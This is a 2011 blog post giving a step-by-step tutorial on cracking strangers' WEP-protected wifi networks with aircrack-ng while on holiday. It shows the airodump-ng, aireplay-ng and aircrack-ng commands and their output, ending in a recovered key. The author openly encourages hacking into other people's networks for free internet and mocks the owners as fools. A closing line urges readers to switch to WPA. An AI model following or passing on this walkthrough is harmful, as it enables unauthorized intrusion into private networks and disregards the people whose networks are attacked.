Wep Wifi Hacking
################
:date: 2011-06-23 12:28
:author: Frank Lazzarini
:category: Linux
:tags: wifi, linux, hacking
:slug: wep-wifi-hacking

Finally a few days off work...due to the national holiday in Luxembourg
I took the opportunity to take a few extra days, to spend some time on
the coast of Belgium with my girlfriend. But don't you just hate that
when you are on vacation and you want to check your email, or get on
your facebook, just to post something / read something and you are not
in your country so you can't use your cell phone to get online cause
it's ridiculously expensive. So what you could do is scan you area for
**WEP wifis** and just **hack into them**. I am not saying that I did
this, I am just suggesting that it might be an idea to get easy internet
access.

**Please respect the privacy of the fool you are about to hack.**

As for hardware I recommend a **Alfa AWUS036HCW Usb Wifi Adapter** which
works great on linux and supports Monitor mode. The network card that
you are going to use has to support the so called **monitor** mode. In
monitor mode you receive all the traffic on a wifi network much like
using a hub instead of a switch on a wired network, or much like
promiscuous mode on ethernet adapters. `Read more`_.

.. image:: /static/images/2011-06-23_wep-wifi-hacking.jpg

The tool that we are going to use is mainly `Aircrack-ng`_ which works
perfectly for cracking WEP networks. Install it on your distro or just
use `Backtrack`_ a live cd that has everything you need and more.

After arriving and unpacking and after my girlfriend fell asleep I
thought it was time to put the my Alfa Wifi Antenna outside the balcony
and start scanning. Earlier whilst walking down a few alleys I took out
my Android phone and switched on the wifi, and look **everywhere** there
are **WEP** Wifi Networks, unbelievable how many ppl don't secure their
wlans here. Well back to the attack. I have the antenna set up and look
what I get ... (I removed the mac addresses for privacy reasons)

::

    # airodump-ng

    CH 13 ][ Elapsed: 4 mins ][ 2011-06-23 00:53                                        
                                                                                                                                                                                   
    BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                                                                                    
                                                                                                                                                                                   
    xx:xx:xx:xx:xx:xx   -1        0        4    0 158  -1   OPN                                                                                                          
    xx:xx:xx:xx:xx:xx  -56      153        3    0   1  54e. OPN              bbox2-bd40                                                                                              
    xx:xx:xx:xx:xx:xx  -59      198        2    0   6  54e. WEP  WEP         dlink                                                                                                    
    xx:xx:xx:xx:xx:xx  -62      155        0    0  11  54e. WEP  WEP         scarlet_wifi_31404                                                                                      
    xx:xx:xx:xx:xx:xx  -62      131        2    0   6  54   WEP  WEP         wifi15_101                                                                                              
    xx:xx:xx:xx:xx:xx  -62      193        0    0   6  54 . OPN              WiFi_20                                                                                                  
    xx:xx:xx:xx:xx:xx  -63      179        0    0   1  54e. WEP  WEP         ESP                                                                                                    
    xx:xx:xx:xx:xx:xx  -65      215        0    0   6  54   WEP  WEP         wifi31c3                                                                                                
    xx:xx:xx:xx:xx:xx  -67       21        0    0   6  54e. WEP  WEP         bbox2-0210                                                                                              
    xx:xx:xx:xx:xx:xx  -67       56        0    0   6  54e. WEP  WEP         bellon                                                                                                  
    xx:xx:xx:xx:xx:xx  -67       31        0    0   6  54 . WEP  WEP                                                                                                     
    ....

Amazing how many networks I can see with this, well the best a lot of
them are WEP secured ... haahaa Paradise ... Free Internet everywhere
.... let's start attacking. I chose the wifi named **ESP**. Let's
start....

::

    # airodump-ng -w wep -c 1 --bssid xx:xx:xx:xx:xx:xx wlan1

    CH  1 ][ Elapsed: 8 s ][ 2011-06-23 00:57                                        
                                                                                                   
    BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                
                                                                                                   
    xx:xx:xx:xx:xx:xx  -60  75       65        0    0   1  54e. WEP  WEP         ESP                  
                                                                                                   
    BSSID              STATION            PWR   Rate    Lost  Packets  Probes      

Alright leave this running and open up a new console and let's
**associate** with the Access Point using **aireplay-ng**.

::

    # aireplay-ng -1 0 -a xx:xx:xx:xx:xx:xx wlan1
    No source MAC (-h) specified. Using the device MAC (yy:yy:yy:yy:yy:yy)
    00:59:25  Waiting for beacon frame (BSSID: xx:xx:xx:xx:xx:xx) on channel 1

    00:59:25  Sending Authentication Request (Open System) [ACK]
    00:59:25  Authentication successful
    00:59:25  Sending Association Request [ACK]
    00:59:25  Association successful :-) (AID: 1)

Awesome it worked right away stupid Access Point .... let's start
capturing some so called **IVs**.

::

    # aircrack-ng wep-01.cap
    Opening wep-01.cap
    Read 11762029 packets.

      #  BSSID              ESSID                     Encryption

      1  xx:xx:xx:xx:xx:xx  ESP                       WEP (2098301 IVs)

    Choosing first network as target.

    Opening wep-01.cap
    Attack will be restarted every 5000 captured ivs.
    Starting PTW attack with 2104125 ivs.
                            KEY FOUND! [ 5B:BD:41:6A:BF ]
           Decrypted correctly: 100%

And we are online, great. Now let's disconnect again, I only connected
once for the sake of trying it out. But this is just how simple and easy
it is with WEP secured wifi networks. Hope this is a lesson for all of
you out there still using WEP as encryption on your wifi.

**Change it to at least WPA right away**.

Happy hacking and happy holiday to all of you.

.. _Read more: http://en.wikipedia.org/wiki/Monitor_mode
.. _Aircrack-ng: http://www.aircrack-ng.org/
.. _Backtrack: http://www.backtrack-linux.org/
